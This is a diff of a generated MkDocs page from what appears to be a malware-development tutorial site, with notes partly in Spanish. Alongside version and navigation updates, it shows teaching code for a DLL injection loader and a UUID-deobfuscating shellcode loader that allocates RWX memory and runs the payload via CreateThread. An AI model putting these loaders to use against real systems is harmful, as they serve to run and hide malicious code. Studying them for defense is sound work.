@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -307,6 +307,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -423,6 +427,62 @@
     
   
     CVE-2026-42980 WMI Underflow (ES)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-en/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox to SYSTEM (EN)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-es/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox a SYSTEM (ES)
   
 
     
@@ -1611,7 +1671,7 @@
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">VOID</span><span class="w"> </span><span class="nf">MsgBoxPayload</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="n">MessageBoxA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Hacking&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Wow !&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">MB_OK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MB_ICONINFORMATION</span><span class="p">);</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="n">MessageBoxA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">"Hacking"</span><span class="p">,</span><span class="w"> </span><span class="s">"Wow !"</span><span class="p">,</span><span class="w"> </span><span class="n">MB_OK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MB_ICONINFORMATION</span><span class="p">);</span>
 </span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="p">}</span>
 </span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
 </span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
@@ -1648,22 +1708,22 @@
 </span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
 </span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">){</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] Missing Argument; Dll Payload To Run </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] Missing Argument; Dll Payload To Run </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 </span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
 </span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="p">}</span>
 </span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Injecting </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s"> To The Local Process Of Pid: %d </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">GetCurrentProcessId</span><span class="p">());</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[i] Injecting </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s"> To The Local Process Of Pid: %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">GetCurrentProcessId</span><span class="p">());</span>
 </span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
 </span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Loading Dll... &quot;</span><span class="p">);</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Loading Dll... "</span><span class="p">);</span>
 </span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] LoadLibraryA Failed With Error : %d </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] LoadLibraryA Failed With Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
 </span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
 </span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="w">    </span><span class="p">}</span>
-</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] DONE ! </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] DONE ! </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 </span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>
 </span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>
-</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;</span><span class="p">);</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[#] Press &lt;Enter&gt; To Quit ... "</span><span class="p">);</span>
 </span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
 </span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>
 </span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
@@ -1704,7 +1764,7 @@
 </span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">  </span><span class="n">DWORD</span><span class="w">  </span><span class="n">flNewProtect</span><span class="p">,</span>
 </span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">      </span><span class="c1">// The new memory protection option</span>
 </span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">  </span><span class="p">[</span><span class="n">out</span><span class="p">]</span><span class="w"> </span><span class="n">PDWORD</span><span class="w"> </span><span class="n">lpflOldProtect</span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">     </span><span class="c1">// Pointer to a &#39;DWORD&#39; variable that receives the previous access protection value of &#39;lpAddress&#39;</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">     </span><span class="c1">// Pointer to a 'DWORD' variable that receives the previous access protection value of 'lpAddress'</span>
 </span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="p">);</span>
 </span></code></pre></div>
 <h2 id="payload-execution-via-createthread">Payload Execution Via CreateThread<a class="headerlink" href="#payload-execution-via-createthread" title="Permanent link">&para;</a></h2>
@@ -1722,7 +1782,7 @@
 </span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">            </span><span class="n">DWORD</span><span class="w">                   </span><span class="n">dwCreationFlags</span><span class="p">,</span>
 </span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">         </span><span class="c1">// Set to 0 - default</span>
 </span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">  </span><span class="p">[</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPDWORD</span><span class="w">                 </span><span class="n">lpThreadId</span>
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">               </span><span class="c1">// pointer to a &#39;DWORD&#39; variable that receives the thread ID (set to NULL - optional)   </span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">               </span><span class="c1">// pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)   </span>
 </span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="p">);</span>
 </span></code></pre></div>
 <h2 id="payload-execution-via-function-pointer">Payload Execution via Function Pointer<a class="headerlink" href="#payload-execution-via-function-pointer" title="Permanent link">&para;</a></h2>
@@ -1782,53 +1842,53 @@
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">    </span><span class="n">PBYTE</span><span class="w">       </span><span class="n">pDeobfuscatedPayload</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
 </span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">      </span><span class="n">sDeobfuscatedSize</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
 </span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Injecting Shellcode The Local Process Of Pid: %d </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessId</span><span class="p">());</span>
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Press &lt;Enter&gt; To Decrypt ... &quot;</span><span class="p">);</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[i] Injecting Shellcode The Local Process Of Pid: %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessId</span><span class="p">());</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[#] Press &lt;Enter&gt; To Decrypt ... "</span><span class="p">);</span>
 </span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
 </span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
-</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Decrypting ...&quot;</span><span class="p">);</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[i] Decrypting ..."</span><span class="p">);</span>
 </span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
 </span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="w">    </span><span class="c1">// if not</span>
 </span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">UuidDeobfuscation</span><span class="p">(</span><span class="n">UuidArray</span><span class="p">,</span><span class="w"> </span><span class="n">NumberOfElements</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pDeobfuscatedPayload</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sDeobfuscatedSize</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
 </span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="w">    </span><span class="p">}</span>
-</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] DONE !</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Deobfuscated Payload At : 0x%p Of Size : %d </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">pDeobfuscatedPayload</span><span class="p">,</span><span class="w"> </span><span class="n">sDeobfuscatedSize</span><span class="p">);</span>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] DONE !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[i] Deobfuscated Payload At : 0x%p Of Size : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">pDeobfuscatedPayload</span><span class="p">,</span><span class="w"> </span><span class="n">sDeobfuscatedSize</span><span class="p">);</span>
 </span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a>
-</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Press &lt;Enter&gt; To Allocate ... &quot;</span><span class="p">);</span>
+</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[#] Press &lt;Enter&gt; To Allocate ... "</span><span class="p">);</span>
 </span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
 </span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="w">    </span><span class="c1">// alocamos memoria</span>
 </span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">pShellcodeAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">sDeobfuscatedSize</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
 </span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="w">    </span><span class="c1">//if not</span>
 </span><span id="__span-11-24"><a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pShellcodeAddress</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] VirtualAlloc Failed With Error : %d </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] VirtualAlloc Failed With Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
 </span><span id="__span-11-26"><a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
 </span><span id="__span-11-27"><a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a><span class="w">    </span><span class="p">}</span>
-</span><span id="__span-11-28"><a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Allocated Memory At : 0x%p </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">pShellcodeAddress</span><span class="p">);</span>
+</span><span id="__span-11-28"><a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[i] Allocated Memory At : 0x%p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">pShellcodeAddress</span><span class="p">);</span>
 </span><span id="__span-11-29"><a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a>
-</span><span id="__span-11-30"><a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;</span><span class="p">);</span>
+</span><span id="__span-11-30"><a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[#] Press &lt;Enter&gt; To Write Payload ... "</span><span class="p">);</span>
 </span><span id="__span-11-31"><a id="__codelineno-11-31" name="__codelineno-11-31" href="#__codelineno-11-31"></a><span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
 </span><span id="__span-11-32"><a id="__codelineno-11-32" name="__codelineno-11-32" href="#__codelineno-11-32"></a><span class="w">    </span><span class="c1">// tambien podemos usar RtlMoveMemory de ntdll.dll</span>
 </span><span id="__span-11-33"><a id="__codelineno-11-33" name="__codelineno-11-33" href="#__codelineno-11-33"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">pShellcodeAddress</span><span class="p">,</span><span class="w"> </span><span class="n">pDeobfuscatedPayload</span><span class="p">,</span><span class="w"> </span><span class="n">sDeobfuscatedSize</span><span class="p">);</span>
-</span><span id="__span-11-34"><a id="__codelineno-11-34" name="__codelineno-11-34" href="#__codelineno-11-34"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">pDeobfuscatedPayload</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">sDeobfuscatedSize</span><span class="p">);</span>
+</span><span id="__span-11-34"><a id="__codelineno-11-34" name="__codelineno-11-34" href="#__codelineno-11-34"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">pDeobfuscatedPayload</span><span class="p">,</span><span class="w"> </span><span class="sc">'\0'</span><span class="p">,</span><span class="w"> </span><span class="n">sDeobfuscatedSize</span><span class="p">);</span>
 </span><span id="__span-11-35"><a id="__codelineno-11-35" name="__codelineno-11-35" href="#__codelineno-11-35"></a>
 </span><span id="__span-11-36"><a id="__codelineno-11-36" name="__codelineno-11-36" href="#__codelineno-11-36"></a>
 </span><span id="__span-11-37"><a id="__codelineno-11-37" name="__codelineno-11-37" href="#__codelineno-11-37"></a><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwOldProtection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
 </span><span id="__span-11-38"><a id="__codelineno-11-38" name="__codelineno-11-38" href="#__codelineno-11-38"></a>
 </span><span id="__span-11-39"><a id="__codelineno-11-39" name="__codelineno-11-39" href="#__codelineno-11-39"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pShellcodeAddress</span><span class="p">,</span><span class="w"> </span><span class="n">sDeobfuscatedSize</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-11-40"><a id="__codelineno-11-40" name="__codelineno-11-40" href="#__codelineno-11-40"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] VirtualProtect Failed With Error : %d </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+</span><span id="__span-11-40"><a id="__codelineno-11-40" name="__codelineno-11-40" href="#__codelineno-11-40"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] VirtualProtect Failed With Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
 </span><span id="__span-11-41"><a id="__codelineno-11-41" name="__codelineno-11-41" href="#__codelineno-11-41"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
 </span><span id="__span-11-42"><a id="__codelineno-11-42" name="__codelineno-11-42" href="#__codelineno-11-42"></a><span class="w">    </span><span class="p">}</span>
 </span><span id="__span-11-43"><a id="__codelineno-11-43" name="__codelineno-11-43" href="#__codelineno-11-43"></a>
-</span><span id="__span-11-44"><a id="__codelineno-11-44" name="__codelineno-11-44" href="#__codelineno-11-44"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Press &lt;Enter&gt; To Run ... &quot;</span><span class="p">);</span>
+</span><span id="__span-11-44"><a id="__codelineno-11-44" name="__codelineno-11-44" href="#__codelineno-11-44"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[#] Press &lt;Enter&gt; To Run ... "</span><span class="p">);</span>
 </span><span id="__span-11-45"><a id="__codelineno-11-45" name="__codelineno-11-45" href="#__codelineno-11-45"></a><span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
 </span><span id="__span-11-46"><a id="__codelineno-11-46" name="__codelineno-11-46" href="#__codelineno-11-46"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">pShellcodeAddress</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-11-47"><a id="__codelineno-11-47" name="__codelineno-11-47" href="#__codelineno-11-47"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] CreateThread Failed With Error : %d </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+</span><span id="__span-11-47"><a id="__codelineno-11-47" name="__codelineno-11-47" href="#__codelineno-11-47"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] CreateThread Failed With Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
 </span><span id="__span-11-48"><a id="__codelineno-11-48" name="__codelineno-11-48" href="#__codelineno-11-48"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
 </span><span id="__span-11-49"><a id="__codelineno-11-49" name="__codelineno-11-49" href="#__codelineno-11-49"></a><span class="w">    </span><span class="p">}</span>
